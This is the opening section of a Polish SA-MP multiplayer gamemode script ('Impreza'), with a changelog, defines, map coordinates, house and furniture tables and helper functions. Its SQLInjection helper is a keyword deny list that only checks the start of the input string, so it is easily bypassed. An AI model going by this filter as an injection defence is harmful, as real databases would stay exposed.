/*
===========================================================================================================================================
 __  .___  ___. .______   .______       _______  ________      ___            _______  .___  ___.    ____    ____  __
|  | |   \/   | |   _  \  |   _  \     |   ____||       /     /   \          |       \ |   \/   |    \   \  /   / /_ |
|  | |  \  /  | |  |_)  | |  |_)  |    |  |__   `---/  /     /  ^  \   ______|  .--.  ||  \  /  |     \   \/   /   | |
|  | |  |\/|  | |   ___/  |      /     |   __|     /  /     /  /_\  \ |______|  |  |  ||  |\/|  |      \      /    | |
|  | |  |  |  | |  |      |  |\  \----.|  |____   /  /----./  _____  \       |  '--'  ||  |  |  |       \    /     | |
|__| |__|  |__| | _|      | _| `._____||_______| /________/__/     \__\      |_______/ |__|  |__|        \__/      |_|

Autorzy: - Dyzieg
         - NitroFuN
         - critical

Mapperzy: - Mr.A.Official
		  - ZawacuS

Podziêkowania: - VisztaPL
			   - Zbyss.
			   - Robokop500

Changelog:
==========IMPREZA-DM v1===========
-
==================================

Dodano:
- System rejestarcji i logowanie
- Hashowanie danych
- Intergracja skryptu z baz¹ danych
- Komunikat o nie znalezionej komendzie
- Komunikaty przy do³¹czaniu/wychodzeniu z serwera
-  kod, test matematyczny, rozsypanka
- Prywatne wiadomoœci
- Czat administracji
- Losowy kolor nicku
- Wybór klasy po pierwszym spawnie
- Naprawa pojazdu pod klawiszem 2
- TextDrawy by Zbyss.
- Losowe teleporty w funkcji
- Uleczanie siê, kupno kamizelki
- Klany wraz z wojnami klanowymi
- Pokemony
- Odliczanie
- System zabaw
- Ekwipunek
- Broñ dnia
- SecondTimer
- Spawn pojazdów pod /v
- Teleportacja do graczy i graczy do siebie (admin, gracz)
- /siema, /nara, /naj
- /do
- Areny
- Zarz¹dzanie kontem
- Sklep
- Zakup broni pod /bronie
- System domów
- System eventów
- Integracja skryptu z GeoIP
- Bank

==========IMPREZA v2===========
-
==================================

===========================================================================================================================================
*/
#include <a_samp>
#include <a_http>
#include <crashdetect>

#define Loop(%0,%1)	for(new %0, __li%0 = %1; %0 != __li%0; %0++)

#undef 		MAX_PLAYERS
#define 	MAX_PLAYERS 		500
#define     MAX_RSPAWNS         50 // Losowe teleporty
#define     MAX_POKEMONS        144 // Pokemony
#define     MAX_PARTS           20 // Czêœci do szukania
#define     MAX_NAPADY          7 // Napady na budynki
#define    	MAX_ARROWS          100 // Strza³ki teleportuj¹ce
#define     MAX_SPEDITIONS      80 // Transporty
#define     MAX_PARKS           25 // ItemParki
#define     MAX_RADARS          30 // Fotoradary na mapie
#define     MAX_KAMIEN          45 // Kamienie w kopalni
#define     MAX_NODMS           50 // Strefy bez DM
#define     MAX_ENTER_VEHICLES  3 // anty crash 1

new PlayerEnterTime[MAX_PLAYERS];
new PlayerSpamCount[MAX_PLAYERS];

new SpawnTimer[MAX_PLAYERS];

new bool:AutomatycznyStart, bool:ReflexActive, ReflexType, ReflexUID, bool:ServerEvent, SEventType, SEventTimer, SEventName[128], SKills, bool:ZnajdzkaActive, ZnajdzkaType, TrwajaceNapady;
new GGWarn[MAX_PLAYERS];

new BlockISP[256];

new DCC_Channel:samp_admin, DCC_Channel:samp_chat;

new bool:IsSpec[MAX_PLAYERS];

new TakedDamage[MAX_PLAYERS];
new LastDamaged[MAX_PLAYERS];

new bool:Suicided[MAX_PLAYERS];
new bool:LoggedOnVip[MAX_PLAYERS];
new DJMusic[256];
new bool:DJPlaying;
new bool:DJHear[MAX_PLAYERS];

new Float:LastX[MAX_PLAYERS], Float:LastY[MAX_PLAYERS], Float:LastZ[MAX_PLAYERS];
new AFKPoints[MAX_PLAYERS];

new Float:TRx[MAX_PLAYERS], Float:TRy[MAX_PLAYERS], Float:TRz[MAX_PLAYERS];

new CarTimer[MAX_PLAYERS];

new bool:Registered[MAX_PLAYERS];
new bool:NOP[MAX_PLAYERS];

new strx[290];

new fAutoC[MAX_PLAYERS];
new bool:BustedMode[MAX_PLAYERS];
new bool:AFK[MAX_PLAYERS];
new AFKTimer[MAX_PLAYERS];
new pVehicles[MAX_PLAYERS];

new bool:KickMsg[MAX_PLAYERS];

new bool:VoteTrwa;
new VoteNie;
new VoteTak;
new bool:VoteGlosowal[MAX_PLAYERS];

new bool:OnTutorial[MAX_PLAYERS];
new TutorialC[MAX_PLAYERS];

new LastState[MAX_PLAYERS];
new Crasher[MAX_PLAYERS];
new LastWorld[MAX_PLAYERS];
new Crashed[MAX_PLAYERS];

new Float:radarX[MAX_RADARS], Float:radarY[MAX_RADARS], Float:radarZ[MAX_RADARS];

new Float:StacjePaliw[][3] = // koordynaty z ibizy, nie biæ
{
    {1938.9250,-1767.3844,13.3828}, // StacjaLs
	{1938.9606,-1778.5350,13.3906}, // StacjaLs
	{1944.5051,-1778.4343,13.3906}, // StacjaLs
	{1944.3630,-1767.0520,13.3828}, // StacjaLs
	{1007.6814,-938.8112,42.1797}, // StacjaLs
	{1000.8928,-939.9948,42.1797}, // StacjaLs
	{-1609.0912,-2718.7280,48.5391}, // Stacjazlsdosf
	{-1605.6575,-2714.3259,48.5335}, // Stacjazlsdosf
	{-1602.5347,-2709.8760,48.5391}, // Stacjazlsdosf
	{-93.7549,-1174.9712,2.2698}, // Stacjazlsdosf
	{-88.8109,-1163.2958,2.2436}, // Stacjazlsdosf
	{605.2943,1704.7194,6.9922}, // StacjaLv
	{608.8022,1699.9808,6.9922}, // StacjaLv
	{612.0022,1694.9396,6.9922}, // StacjaLv
	{615.6826,1689.9932,6.9922}, // StacjaLv
	{618.8209,1685.0415,6.9922}, // StacjaLv
	{622.3140,1680.0767,6.9922}, // StacjaLv
	{658.9260,-570.3122,16.3359}, // Stacjazlsdolv
	{658.8557,-559.6202,16.3359}, // Stacjazlsdolv
	{1385.4777,461.6823,20.1536}, // Stacjazlsdolv
	{1381.2158,464.0631,20.1686}, // Stacjazlsdolv
	{1378.6942,458.1333,19.9166}, // Stacjazlsdolv
	{1383.3866,456.0471,19.9150}, // Stacjazlsdolv
	{1006.6976,-933.0057,42.1797}, // StacjaLs
	{1000.0087,-934.2648,42.1797}, // StacjaLs
	{-2029.8179,156.9146,28.8359}, // StacjaSf
	{-1676.1157,427.1001,7.1797}, // StacjaSf
	{-1682.9679,419.7285,7.1797}, // StacjaSf
	{-1689.5183,412.8611,7.1797}, // StacjaSf
	{-1662.4639,413.9916,7.1797}, // StacjaSf
	{-1669.4493,406.7770,7.1797}, // StacjaSf
	{-1676.1068,399.9002,7.1797}, // StacjaSf
	{-2407.1453,981.5126,45.2969}, // StacjaSf
	{-2406.2246,970.9566,45.3016}, // StacjaSf
	{-2415.2029,970.9553,45.2969}, // StacjaSf
	{-2415.0759,981.6288,45.2969}, // StacjaSf
	{-2023.4937,156.8957,28.8359}, // StacjaSf
	{-1464.9557,1864.2179,32.6328}, // StacjaLv
	{-1477.9186,1863.4485,32.6328}, // StacjaLv
	{-1326.9337,2682.7888,50.0625}, // StacjaLv
	{-1328.6079,2677.4597,50.0625}, // StacjaLv
	{-1329.0018,2672.1143,50.0625}, // StacjaLv
	{2141.8677,2748.0544,10.8203}, // StacjaLv
	{2153.4819,2747.4468,10.8203}, // StacjaLv
	{2147.4082,2747.7205,10.8203}, // StacjaLv
	{1601.6879,2199.0405,10.8203}, // StacjaLv
	{1595.8450,2198.8960,10.8203}, // StacjaLv
	{1590.0479,2198.7522,10.8203}, // StacjaLv
	{2202.5906,2469.8149,10.8203}, // StacjaLv
	{2202.8901,2474.3091,10.8203}, // StacjaLv
	{2203.2700,2480.0295,10.8203}, // StacjaLv
	{2634.4685,1106.4357,10.8130}, // StacjaLv
	{2639.8816,1106.4393,10.8203}, // StacjaLv
	{2645.4080,1106.4425,10.8203}, // StacjaLv
	{-1689.8752,412.9897,7.1797}, // let
	{653.0187,-570.4732,16.3359}, // Stacjazlsdolv
	{653.1387,-559.7069,16.3359} // Stacjazlsdolv
};

new ppip[MAX_PLAYERS][16], kraj[MAX_PLAYERS][256], miasto[MAX_PLAYERS][256], isp[MAX_PLAYERS][256];

#define splitf(%0) (format(strx, sizeof(strx), %0), strx)

// czas na zalogwoanie
#define	 SECONDS_TO_LOGIN 		30

// standardowy spawn
#define 	DEFAULT_POS_X 		1958.3783
#define 	DEFAULT_POS_Y 		1343.1572
#define 	DEFAULT_POS_Z 		15.3746
#define 	DEFAULT_POS_A 		270.1425

// kolory
#define GREY 0xAFAFAFAA
#define GREEN 0x33AA33AA
#define RED 0xB2B2B2AA
#define YELLOW 0xFFFF00AA
#define WHITE 0xFFFFFFAA
#define BLUE 0x0000BBAA
#define LIGHTBLUE 0x33CCFFAA
#define ORANGE 0xFCD8A9AA
#define LIME 0x10F441AA
#define MAGENTA 0xFF00FFFF
#define NAVY 0x000080AA
#define AQUA 0xF0F8FFAA
#define CRIMSON 0xDC143CAA
#define FLBLUE 0x6495EDAA
#define BISQUE 0xFFE4C4AA
#define BLACK 0x000000AA
#define CHARTREUSE 0x7FFF00AA
#define BROWN 0XA52A2AAA
#define CORAL 0xFF7F50AA
#define GOLD 0xB8860BAA
#define GREENYELLOW 0xADFF2FAA
#define INDIGO 0x4B00B0AA
#define IVORY 0xFFFF82AA
#define LAWNGREEN 0x7CFC00AA
#define SEAGREEN 0x20B2AAAA
#define LIMEGREEN 0x32CD32AA
#define MIDNIGHTBLUE 0X191970AA
#define MAROON 0x800000AA
#define OLIVE 0x808000AA
#define ORANGERED 0xFF4500AA
#define PINK 0xFFC0CBAA
#define SPRINGGREEN 0x00FF7FAA
#define TOMATO 0xFF6347AA
#define YELLOWGREEN 0x9ACD32AA
#define MEDIUMAQUA 0x83BFBFAA
#define MEDIUMMAGENTA 0x8B008BAA

#define C_RED "{B2B2B2}"
#define C_WHITE "{FFFFFF}"
#define C_GREEN "{33AA33}"
#define C_NEUTRAL "{A9C4E4}"
#define C_ORANGE "{fcd8a9}"
#define C_YELLOW "{3399ff}"
#define C_NICK "{67c2f7}"
#define C_ZABAWA "{99ccff}"
#define C_BLUE1 "{61d7ef}"
#define C_LGREEN "{78e499}"
#define C_OLIVE "{9bcc28}"
#define C_LOLIVE "{ceed70}"
#define C_DISCORD "{6f8cce}"

#define PLUS "{009f00}+  "
#define PYTAJNIK "{a9d2fc}*  "

#define HOLDING(%0)				((newkeys & (%0)) == (%0))
#define PRESSED(%0)				(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define RELEASED(%0)			(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

// rangi
#define JUNIOR "{ff66f4}Eventowicz"
#define ADMIN "{ffff00}Admin"
#define VHA "{FF4500}Vice Zarz¹d"
#define HA "{FF0000}Zarz¹d"

new bool:LVLUP = false;
new bool:Beta = true;

new Shooter[MAX_PLAYERS];
new Text:Ann, AnnTimer;
new STimer;
new Text:SPTD;
new LastKilled[MAX_PLAYERS], Streak[MAX_PLAYERS];
new Text:SV0, Text:SV1;

new bool:ENMode[MAX_PLAYERS];

new bool:KodPrzepisal[MAX_PLAYERS];
new CreatedRandomTP;
new Text3D:RandomTPTD[MAX_RSPAWNS];
new RandomTPPickup[MAX_RSPAWNS];
new CreatedNODM, Float:nDMMinX[MAX_NODMS], Float:nDMMinY[MAX_NODMS], Float:nDMMaxX[MAX_NODMS], Float:nDMMaxY[MAX_NODMS];
new Float:RandomX[MAX_RSPAWNS], Float:RandomY[MAX_RSPAWNS], Float:RandomZ[MAX_RSPAWNS];
new kodTime, kodTrwa, SlowoKod[12], SlowoRozsypanka[16], SlowoPodpowiedz[16];
new wyraztimestart, wyraztimeend;
new wyrazTime, bool:wyrazTrwa;
new BattleTimer[MAX_PLAYERS];
new TPTimer[MAX_PLAYERS];
new mathTime, mathExercise[16], mathResult = -897234;
new ClanMember[MAX_PLAYERS];
new ClanTimer[MAX_PLAYERS];
new bool:Sarnanamapie, Text3D:Sarna3D, SarnaObj;

#pragma unused mathTime
#pragma unused kodTime
#pragma unused wyrazTime
#pragma unused wyraztimeend
#pragma unused wyraztimestart
#pragma unused ReflexType

#include <mysql>
#include <a_actor>
#include <center>
#include <discord-connector>
#include <dudb>
#include <mSelection>
#include <filesystem>
#include <foreach>
#include <geoip> // http://forum.sa-mp.com/showthread.php?t=296171
#include <md5>
#include <progress>
#include <sscanf2>
#include <streamer>
#include <vehicleplus>
#include <y_va>
#include Impreza\aim.inc
#include Impreza\OPA.inc
#include Impreza\zcmd.inc
#include <YSI\y_iterate>
#include <TOTP>
new BDbudynek;
#include Impreza\obiekty.pwn
#include Impreza\animacje.pwn

stock SetVehicleHandling(vehicleid)
{
	new model = GetVehicleModel(vehicleid);
	switch(model)
	{
	    case 400, 404, 479: SetVehicleSpeedCap(vehicleid, 60);
	    case 401, 529, 546, 566: SetVehicleSpeedCap(vehicleid, 90);
	    case 402: SetVehicleSpeedCap(vehicleid, 90);
	    case 403: SetVehicleSpeedCap(vehicleid, 90);
	    case 405, 542, 547, 589: SetVehicleSpeedCap(vehicleid, 110);
	    case 406: SetVehicleSpeedCap(vehicleid, 25);
	    case 407, 527, 549, 550, 551, 565, 580: SetVehicleSpeedCap(vehicleid, 110);
	    case 408: SetVehicleSpeedCap(vehicleid, 30);
	    case 409: SetVehicleSpeedCap(vehicleid, 90);
	    case 410: SetVehicleSpeedCap(vehicleid, 85);
	    case 412, 526, 558, 561, 562, 587: SetVehicleSpeedCap(vehicleid, 100);
	    case 413, 414, 416, 418, 482: SetVehicleSpeedCap(vehicleid, 90);
	    case 419, 517: SetVehicleSpeedCap(vehicleid, 100);
		case 422, 423, 436, 573, 600, 605, 609: SetVehicleSpeedCap(vehicleid, 70);
		case 437, 552: SetVehicleSpeedCap(vehicleid, 70);
		case 458, 554: SetVehicleSpeedCap(vehicleid, 110);
		case 471, 531, 543: SetVehicleSpeedCap(vehicleid, 60);
		case 475: SetVehicleSpeedCap(vehicleid, 110);
		case 491: SetVehicleSpeedCap(vehicleid, 120);
		case 498: SetVehicleSpeedCap(vehicleid, 80);
		case 506: SetVehicleSpeedCap(vehicleid, 120);
		case 507, 535, 536: SetVehicleSpeedCap(vehicleid, 120);
		case 508: SetVehicleSpeedCap(vehicleid, 70);
		case 516, 540: SetVehicleSpeedCap(vehicleid, 105);
		case 541: SetVehicleSpeedCap(vehicleid, 120);
	}
	return 1;
}

stock IsPlayerFalling(playerid) {
    new index = GetPlayerAnimationIndex(playerid);
    if(index >= 958 && index <= 979 || index == 1130 || index == 1195 || index == 1132) return 1;
    return 0; }

stock SpecToggle(playerid, status) {
	TogglePlayerSpectating(playerid, status);
	if(status == 1) IsSpec[playerid] = true;
	if(status == 0) IsSpec[playerid] = false; }

stock UnixTime(type, time)
{
 	switch(tolower(type))
	{
		case 'd': 	   time = time * 86400;
		case 'h': 	   time = time * 3600;
		case 'm': 	   time = time * 60;
	}
	return time;
}

stock UnixTimeToDate(time_start, time_str[], size = sizeof(time_str))
{
	new secs = time_start - gettime(), data[12];
	if(secs < 0)
	{
		format( time_str, size, "---");
		return 0;
	}

	new Lat = secs / 31556926;
	secs -= Lat*31556926;
	new Miesiecy = secs / (86400*31);
	secs -= Miesiecy*(86400*31);
	new Dni = secs / 86400;
	secs -= Dni*86400;
	new Godzin = secs / 3600;
	secs -= Godzin*3600;
	new Minut = secs / 60;
	secs -= Minut*60;
	new time = secs % 60;

	if(Lat > 0) format(data, sizeof(data), "%d %s", dli(Lat, "roku", "lat", "lat"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	if(Miesiecy > 0) format(data, sizeof(data), "%d %s", Miesiecy, dli(Miesiecy,"miesi¹c","miesi¹ce","miesi¹ce"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	if(Dni > 0) format(data, sizeof(data), "%d %s",Dni, dli(Dni,"dzieñ","dni","dni"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	if(Godzin > 0) format(data, sizeof(data), "%d %s", Godzin, dli(Godzin,"godzina", "godziny","godzin"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	if(Minut > 0) format(data, sizeof(data), "%d %s", Minut, dli(Minut,"minuta","minuty","minut"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	if(time > 0) format(data, sizeof(data), "%d %s", secs, dli(secs,"sekunda","sekundy","sekund"));
	if(data[0]) format(time_str, size, "%s %s", time_str, data);
	data[0] = EOS;

	return 1;
}

stock IsPosInWater(Float:x, Float:y, Float:z, Float:dist = 1.0, Float:height = 3.0)
{
	new Float:tmp;

	for(new i; i < 6; i++)
		if(CA_RayCastLine(x + (dist * floatsin(i * 60.0, degrees)), y + (dist * floatcos(i * 60.0, degrees)), z + height, x + (dist * floatsin(i * 60.0, degrees)), y + (dist * floatcos(i * 60.0, degrees)), z - height, tmp, tmp, tmp) == WATER_OBJECT)
			return 1;
	return 0;
}

stock SQLInjection(String[])
{
	if(strfind(String, "INSERT", true)== 0) return 1;
	if(strfind(String, "UPDATE", true)== 0) return 1;
    if(strfind(String, "DELETE", true)== 0) return 1;
    if(strfind(String, "FROM", true)== 0) return 1;
    if(strfind(String, "TRUNCATE", true)== 0)return 1;
    if(strfind(String, "DROP", true)== 0)return 1;
    if(strfind(String, "ALTER", true)== 0)return 1;
    if(strfind(String, "TABLE", true)== 0)return 1;
    if(strfind(String, "WHERE", true)== 0)return 1;
    if(strfind(String, "SELECT", true)== 0)return 1;
    if(strfind(String, "NULL", true)== 0)return 1;
    if(strfind(String, "EXISTS", true)== 0)return 1;
    if(strfind(String, ";", true)== 0)return 1;
    if(strfind(String, "--", true)== 0)return 1;
    if(strfind(String, "*", true)== 0)return 1;
    if(strfind(String, "'", true)== 0)return 1;
    if(strfind(String, "`", true)== 0)return 1;
    if(strfind(String, "%s", true)== 0)return 1;
     if(strfind(String, "%d", true)== 0)return 1;
    if(strfind(String, "%.", true)== 0)return 1;
 	return 0;
}

#define IsKlasterFree(%0) (!Klastry[%0][0] || !Klastry[%0][1] || !Klastry[%0][2] || !Klastry[%0][3] || !Klastry[%0][4] || !Klastry[%0][5] || !Klastry[%0][6] || !Klastry[%0][7])
#define HasAllKlasters(%0) (Klastry[%0][0] && Klastry[%0][1] && Klastry[%0][2] && Klastry[%0][3] && Klastry[%0][4] && Klastry[%0][5] && Klastry[%0][6] && Klastry[%0][7])

new bool:Klastry[MAX_PLAYERS][8];

new PingLimit[MAX_PLAYERS];

new SpectatingPlayer[MAX_PLAYERS];

#define AUTOR 		 "Dyzieg"
#define AUTOR2       "NitroFuN"
#define AUTOR3       "critical"
#define WERSJA 		 "•IMPREZA v2•"
#define GM_VER       "v2.0"
#define AKTUALIZACJA "13.08.2017 23:47"
#define FORUM 		 "imprezaserver.eu"
#define NAZWA 		 "{6ba7d6}Impreza{79c0f7}Server"
#define COPYRIGHT    "{424242}© {5e5e53}ImprezaServer 2017 ({424242}imprezaserwer.pl{5e5e53})\n{FF0000}Wszelkie prawa zastrze¿one."
#define RADIO        "http://4stream.pl:18130/listen.pls?sid=1"
#define TUT_AUDIO    "http://idm.imprezaserwer.pl/tutorial.mp3"

// MySQL config
#define		MYSQL_HOST 			"ip"
#define		MYSQL_USER 			"user"
#define 	MYSQL_PASSWORD 		"password"
#define		MYSQL_DATABASE 		"nazwa_bazy"

#define MAX_HOUSES              100
#define MAX_HOUSE_NAME     	48
#define MAX_HOUSE_PASSWORD  	16
#define MAX_HOUSE_ADDRESS   	48
#define MAX_INT_NAME        	32
#define KONTA   100000
#define MAX_AFK_TIME 3000

#define INVALID_HOUSE_ID    -1
#define LOCK_MODE_NOLOCK    0
#define LOCK_MODE_PASSWORD  1
#define LOCK_MODE_OWNER     2
#define SELECT_MODE_EDIT    0
#define SELECT_MODE_SELL    1

SendClientMessageToAllEx(color, polish[], english[], r_value = 1) {
	Loop(playerid, MAX_PLAYERS) {
		if(ENMode[playerid]) { if(IsPlayerConnected(playerid)) SendClientMessage(playerid, color, english); }
		else { if(IsPlayerConnected(playerid)) SendClientMessage(playerid, color, polish); } }
	return r_value; }

SendClientMessageEx(playerid, color, polish[], english[], r_value = 1) {
	if(ENMode[playerid]) { if(IsPlayerConnected(playerid)) SendClientMessage(playerid, color, english); }
	else { if(IsPlayerConnected(playerid))SendClientMessage(playerid, color, polish); }
	return r_value; }

enum    e_sazone
{
    SAZONE_NAME[28],
    Float: SAZONE_AREA[6]
};

enum e_pData
{
    PickupHouseID,
    InHouse,
};
new pData[MAX_PLAYERS][e_pData];

enum e_house
{
	Owner[24],
	pUID,
	hName[MAX_HOUSE_NAME],
	Password[MAX_HOUSE_PASSWORD],
	Float: houseX,
	Float: houseY,
	Float: houseZ,
	Price,
	Interior,
	LockMode,
	DomTime,
	Text3D: HouseLabel,
	HousePickup,
	HouseIcon,
	Czynsz
};

enum e_interior
{
	IntName[MAX_INT_NAME],
	Float: intX,
	Float: intY,
	Float: intZ,
	Float: intA,
	intID,
	PriceInt,
	Text3D: intLabel,
	intPickup
};

enum e_furnituredata
{
	ModelID,
	Name[32],
	Price
};

enum e_furniture
{
	SQLID,
	HouseID,
	ArrayID,
	Float: furnitureX,
	Float: furnitureY,
	Float: furnitureZ,
	Float: furnitureRX,
	Float: furnitureRY,
	Float: furnitureRZ
};


new HouseData[MAX_HOUSES][e_house];
new Iterator:Houses<MAX_HOUSES>;
new Iterator:FreeHouses<MAX_HOUSES>;

new Float:HouseDrzwi[][3] = {
	{2196.8518,-1204.3594,1049.0234}, // int0
	{2259.3813,-1135.8342,1050.6403}, // exit1
	{2282.7971,-1140.2849,1050.8984},// exit2
	{2233.6609,-1115.2628,1050.8828},// 3
	{2218.4033,-1076.2299,1050.4844}, // 4
	{2496.0796,-1692.5524,1014.7422},// exit5
	{2365.3875,-1135.5984,1050.8826}, // exit6
	{2317.8840,-1026.7615,1050.2178}, // exit7
	{2324.4731,-1149.5416,1050.7101},// exit8
	{140.2226,1365.9219,1083.8594}, // exit9
	{1260.8894,-785.4234,1091.9063} // exit10
};

new HouseInteriors[][e_interior] =
{
	{"Interior 1", 2193.9001, -1202.4185, 1049.0234, 91.9386, 6, 	100000},
	{"Interior 2", 2262.5627, -1136.1664, 1050.6328, 267.5372, 10, 	200000},
	{"Interior 2", 2283.0632, -1136.9760, 1050.8984, 358.7963, 11, 	300000},
	{"Interior 3", 2233.6057, -1111.7039, 1050.8828, 2.9124, 5, 	400000},
	{"Interior 4", 2214.8909, -1076.0967, 1050.4844, 88.8910, 1, 	500000},
	{"Interior 5", 2495.8035, -1695.0997, 1014.7422, 181.9661, 3, 	600000},
	{"Interior 6", 2365.2883, -1132.5228, 1050.8750, 358.0393, 8, 	700000},
	{"Interior 7", 2320.0730, -1023.9533, 1050.2109, 358.4915, 9, 	800000},
	{"Interior 8", 2324.4490, -1145.2841, 1050.7101, 357.5873, 12, 	900000},
	{"Interior 9", 140.1788, 1369.1936, 1083.8641, 359.2263, 5, 	1000000},
	{"Interior 10", 1264.7765, -781.2485, 1091.9063, 270.6992, 5, 	1250000}
};

new HouseFurnitures[][e_furnituredata] =
{
    {3111, "Plan budynku", 50},
    {2894, "Ksi¹¿ka", 100},
    {2277, "Obraz kota", 100},
    {1753, "Skórzana sofa", 1200},
    {1754, "Skórzany fotel", 350},
    {1703, "Zwyk³a sofa", 600},
    {1255, "Drewniany le¿ak", 50},
    {19581, "Patelnia", 30},
    {19584, "Rondel", 30},
    {19590, "Miecz", 100},
    {19525, "Tort weselny", 100},
    {1742, "Rega³ na ksi¹¿ki", 800},
    {1518, "Telewizor kineskopowy", 250},
    {19609, "Perkusja", 500},
    {19787, "Telewizor LCD 42 cale", 750},
    {19786, "Telewizor LCD 60 cali", 1000},
    {2627, "Bie¿nia", 300},
    {1736, "Poro¿e", 100},
    {2630, "Rowerek", 200},
    {2226, "BoomBox", 100},
    {1841, "Ma³y g³oœnik", 50},
    {2231, "G³oœnik", 100},
    {2229, "Du¿y g³oœnik", 200},
    {2514, "Toaleta", 150},
    {1208, "Pralka", 300},
    {1828, "Dywan z tygryska", 100},
    {1778, "Wiaderko z mopem", 50},
    {1701, "Du¿e ³o¿e ma³¿eñskie", 500},
    {1795, "£ó¿ko z materacem", 250},
    {2134, "Szafka", 100},
    {1741, "Komoda", 150},
    {16638, "Fotel", 100},
    {1775, "Automat z fant¹", 350},
    {1809, "Kino domowe (bez g³oœników)", 100},
    {1806, "Krzes³o obrotowe", 100},
    {1810, "Krzes³o", 50},
    {1814, "£awa", 120},
    {1815, "Okr¹g³a ³awa", 150},
    {1817, "£awa ze szk³em", 180},
    {1821, "Rega³ na buty", 100},
    {1829, "Sejf", 600},
    {1946, "Pi³ka do kosza", 30},
    {1950, "Butelka denaturatu", 50},
    {2001, "Drzewko doniczkowe", 70},
    {2011, "Palma doniczkowa", 80},
    {2023, "Du¿a lampa nocna", 120},
    {2025, "Du¿a szafa na ubrania", 300},
    {2047, "Plakat na œciane", 20},
    {2064, "Zabytkowa armata", 400},
    {2070, "Lampka nocna", 20},
    {2100, "Kino domowe", 200},
    {2133, "Komoda", 100},
    {2135, "Kuchnia (zestaw 1/5)", 200},
    {2136, "Kuchnia (zestaw 2/5)", 180},
    {2137, "Kuchnia (zestaw 3/5)", 150},
    {2138, "Kuchnia zmywarka (zestaw 4/5)", 180},
    {2139, "Kuchnia dodatkowa szafka (5/5)", 100},
    {2149, "Mikrofalówka", 100},
    {2194, "Kaktus ozdobny", 10},
    {2195, "Kwiat doniczkowy", 30},
    {2244, "Drewniana doniczka z kwiatkiem", 20},
    {2247, "Szklana doniczka z kwiatkami", 20},
    {2228, "£opata", 20},
    {2254, "Obraz taxi 4", 30},
    {2255, "Obraz +18", 50},
    {2256, "Obraz hawaje", 20},
    {2294, "Kuchenka z okapem", 110},
    {2313, "Rega³ pod TV", 60},
    {2314, "Reag³ pod TV kwadratowy", 80},
    {2526, "Wanna", 130},
    {2527, "Prysznic", 100},
    {2571, "Skórzane dwa fotele z ³aw¹", 700},
    {2600, "Luneta", 140},
    {2613, "Kosz", 30}
};

new LockNames[][] = {""C_LOLIVE"Otwarty", ""C_RED"Zablokowany has³em", ""C_RED"Tylko dla w³aœciciela"};

#define MAX_FURNITURE 60

// zabawy
#define MAX_GAMES 9
#define MAX_CHECKPOINTS 30
#define MAX_RACES 30
#define MAX_HAYS 30
#define MAX_PLATFORMY 100
#define MAX_TRHAJS 29
#define MAX_BABOXES 56
#define MAX_BATEAMS 4
#define RC 0
#define CH 1
#define RK 2
#define SP 3
#define DB 4
#define GG 5
#define BD 6
#define TR 7
#define BA 8

new rudadnia;

new HajsPickup[MAX_TRHAJS], bool:HajsPodniesiony[MAX_TRHAJS], stworzonehajsy;

new Box[MAX_BABOXES], bool:BoxOnMap[MAX_BABOXES], BoxType[MAX_BABOXES], PunktyBA[MAX_BATEAMS];
new BATeam[MAX_PLAYERS], boxes, BAPlayers;

new LowienieTrwa[MAX_PLAYERS];
new FTimer[MAX_PLAYERS];
new Bar:FishingBar[MAX_PLAYERS];
new FProgress[MAX_PLAYERS];

new Bar:GornictwoBar[MAX_PLAYERS];
new GProgress[MAX_PLAYERS];
new bool:GBarOn[MAX_PLAYERS];

new Opcja[250];

new bool:EVStartuje, bool:EVTrwa, EVPlayers, bool:EVUczestnik[MAX_PLAYERS], bool:EVOrganizator[MAX_PLAYERS], EVType;
new Float:EVx, Float:EVy, Float:EVz;
new EVTeam[MAX_PLAYERS], EVattackers, EVdeffenders;
new bool:IsTrue, bool:PytanieZadane, OXTimer;

new JailTimeP[MAX_PLAYERS];

new Float:SavedX[MAX_PLAYERS], Float:SavedY[MAX_PLAYERS], Float:SavedZ[MAX_PLAYERS];
new Float:SavedAdminX, Float:SavedAdminY, Float:SavedAdminZ;

new DBTimer;
new de[256], de2[256];

new lastdiscord, lastdiscordname[128], DiscordBlock, DiscordLoot, bool:DiscordConnected[MAX_PLAYERS], DiscordUser[128][MAX_PLAYERS], DiscordSendedID, bool:DiscordChat[MAX_PLAYERS];
#pragma unused lastdiscord

new WalizkaPickup;
new FigurkaPickup;
new BombaPickup, BombaTimer, Float:BombaPos[3];

new Float:BombX[MAX_PLAYERS], Float:BombY[MAX_PLAYERS], Float:BombZ[MAX_PLAYERS], BombObject[MAX_PLAYERS], bool:BombArmed[MAX_PLAYERS];

GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance) {
	new Float:a;

	GetPlayerPos(playerid, x, y, a);
	GetPlayerFacingAngle(playerid, a);

	if (GetPlayerVehicleID(playerid)) {
		GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}

	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees)); }

new Text:Event;

forward BombTimer(playerid);
public BombTimer(playerid) {
	CreateExplosion(BombX[playerid], BombY[playerid], BombZ[playerid], 11, 10);
	SendClientMessage(playerid, -1, "{AFAFAF}Bomba zosta³a zdetonowana.");
	DestroyDynamicObject(BombObject[playerid]);
	return BombArmed[playerid] = false; }

forward EndVote();
public EndVote()
{
	VoteTrwa = false;
	new textstr[256];
	format(textstr, sizeof(textstr), ""C_YELLOW"Wynik g³osowania: "C_LOLIVE"%d"C_YELLOW":"C_RED"%d", VoteTak, VoteNie);
	SendClientMessageToAll(-1, textstr);
	VoteTak = 0;
	VoteNie = 0; }


new SpeedWarnings[MAX_PLAYERS];

new isCbug[MAX_PLAYERS+1];
new bool:disparou[MAX_PLAYERS+1] = false;
new Float:ccount[4][MAX_PLAYERS+1];

new bool:TworzyStrzalke[MAX_PLAYERS];

new Text3D:AT[8];

new bool:BDCC;
new BDHP;
new Text3D:BDText;

new bool:Spawning[MAX_PLAYERS];

#define KEY_AIM					128

